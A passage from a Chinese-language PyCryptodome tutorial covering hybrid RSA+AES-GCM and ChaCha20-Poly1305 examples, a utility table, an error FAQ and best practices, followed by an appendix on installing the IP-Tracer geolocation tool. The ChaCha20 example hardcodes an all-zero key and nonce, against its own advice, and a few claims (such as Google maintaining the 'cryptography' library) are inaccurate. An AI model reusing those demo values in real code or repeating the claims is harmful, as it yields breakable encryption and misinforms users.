cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
ct, tag = cipher_aes.encrypt_and_digest(b'A very long secret message...' * 100)

# RSA 加密 AES 密钥
cipher_rsa = PKCS1_OAEP.new(pub_key)
enc_aes_key = cipher_rsa.encrypt(aes_key)

# 传输: enc_aes_key + nonce + tag + ct

# ---- 解密 ----
cipher_rsa = PKCS1_OAEP.new(key_rsa)
aes_key = cipher_rsa.decrypt(enc_aes_key)

cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
pt = cipher_aes.decrypt_and_verify(ct, tag)
```

## ChaCha20-Poly1305（流密码 AEAD）

Google 推荐的流密码方案，比 AES 快（尤其在没有 AES 硬件加速的设备上）。密钥 32 字节，Nonce 8 或 12 字节（推荐 12）。纯软件实现快、无块大小限制、自带认证标签，适合移动端 / IoT 设备。

```python
from Crypto.Cipher import ChaCha20_Poly1305

key = b'0' * 32     # 32 字节密钥
nonce = b'0' * 12   # 12 字节 Nonce（推荐）

cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
ct, tag = cipher.encrypt_and_digest(plaintext)

cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
pt = cipher.decrypt_and_verify(ct, tag)
```

## 实用工具函数

| 模块 | 函数 | 说明 |
|---|---|---|
| `Crypto.Util.Padding` | `pad(data, block_size, style='pkcs7')` | PKCS7 填充 |
| `Crypto.Util.Padding` | `unpad(padded_data, block_size, style='pkcs7')` | PKCS7 去填充 |
| `Crypto.Util.number` | `bytes_to_long(b)` / `long_to_bytes(n)` | bytes 与 大整数互转（RSA 需要） |
| `Crypto.Util.number` | `size(n)` / `GCD(a,b)` / `inverse(a,m)` | 数论工具 |
| `Crypto.Random` | `get_random_bytes(n)` | 密码学安全随机字节 |
| `Crypto.Random` | `random.StrongRandom` | 密码学安全随机数生成器 |
| `Crypto.Util.asn1` | DER 编码 / 解码 | 处理证书和签名格式 |
| `Crypto.IO` | PEM 编码 / 解码 | PEM 格式读写 |

## 常见问题与排错（FAQ）

| 问题 | 原因与解决 |
|---|---|
| ModuleNotFoundError: No module named 'Crypto' | 没安装或装错包：`pip install pycryptodome`（不是 pycrypto 也不是 crypto） |
| import Crypto vs import crypto | 小写 crypto 是系统自带空包、功能不全：必须 `from Crypto`（大写 C）导入 |
| ValueError: Input strings must be a multiple of 16 | 明文不是 16 的倍数且没做 PKCS7 填充：用 `pad()` 填充后再加密 |
| ValueError: MAC check failed | GCM/HMAC 认证失败、密文或 Tag 被篡改：检查 nonce/tag/密文是否完整传输 |
| TypeError: a bytes-like object is required, not 'str' | 传了 str 而非 bytes：所有数据用 `b'hello'` 或 `'hello'.encode()` |
| Key must be 16, 24, or 32 bytes long | AES 密钥长度不对：AES-128=16 字节、AES-192=24 字节、AES-256=32 字节 |
| Nonce 重复使用导致安全崩溃 | CTR/GCM 模式下重用了同一 Nonce：每次加密必须生成新的随机 Nonce |
| AES 密钥 / IV 从哪来 | 密钥用 KDF 派生（PBKDF2/scrypt），IV/Nonce 随机生成：绝对不能硬编码密钥 |
| 性能问题 | PyCryptodome 是纯 Python（部分 C 加速）：大数据量加密建议用 `cryptography` 库（Google 维护，更快的 C 实现） |

## 安全最佳实践总结

| 实践 | 说明 |
|---|---|
| 永远不要硬编码密钥 | 密钥从 KDF 派生、从安全存储读取，或使用 HSM / 密钥管理服务 |
| 密钥长度 | AES 至少 256 位，RSA 至少 2048 位（推荐 4096），ECC 至少 P-256 |
| IV / Nonce 每次不同 | 每个加密操作使用新的随机 IV/Nonce，绝不能重复 |
| 优先使用 AEAD 模式 | AES-GCM 或 ChaCha20-Poly1305（同时提供加密和认证） |
| 使用 KDF 派生密钥 | 用 PBKDF2 / scrypt / Argon2 从密码派生密钥（PBKDF2 迭代至少 10 万次） |
| 签名用 PSS / ECC | 不要用 PKCS1_v1_5 签名（PSS 更安全） |
| 不要自己设计加密方案 | 使用经过验证的标准方案（如 RSA+AES 混合加密） |
| 敏感数据用 bytes | 所有密钥、IV、密文都用 bytes 类型，避免字符串转换错误 |

# 附：IP-Tracer 小工具

IP-Tracer 是 Kali 上用于查询 IP 地理位置的小工具，集成 `curl` 与 ip-api.com，脚本化地进行查询。

安装：

```bash
git clone https://github.com/rajkumardusad/IP-Tracer.git
cd IP-Tracer
chmod +x install
./install
```

安装成功后即可查询，常用参数：

| 参数 | 作用 |
|---|---|
| `-t <target_ip>` | 追踪指定 IP（trace target ip） |
| `-m` | 追踪本机 IP（trace your own ip） |
| `-h` / `help` | 显示帮助 |
| `-u` / `update` | 更新 IP-Tracer |
| `start` | 启动 IP-Tracer 交互式菜单 |
